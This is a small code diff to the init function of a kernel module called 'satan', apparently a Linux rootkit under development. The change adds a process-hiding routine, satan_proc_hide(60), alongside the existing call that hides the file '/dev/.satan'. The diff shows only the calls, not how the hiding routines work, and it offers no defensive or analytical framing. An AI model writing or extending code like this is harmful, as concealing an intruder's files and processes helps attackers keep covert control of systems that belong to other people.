@@ -7,6 +7,7 @@
 #include "cdev.h"
 #include "file.h"
 #include "module.h"
+#include "proc.h"
 #include "syscall.h"
 
 static int __init satan_init(void)
@@ -17,8 +18,8 @@ static int __init satan_init(void)
         satan_syscall_init();
         satan_file_init();
 
-        satan_file_hide("/dev/.satan");  // hide file
-        satan_file_hide("/proc/60");  // hide process
+        satan_file_hide("/dev/.satan");
+        satan_proc_hide(60);
 
         return 0;
 }
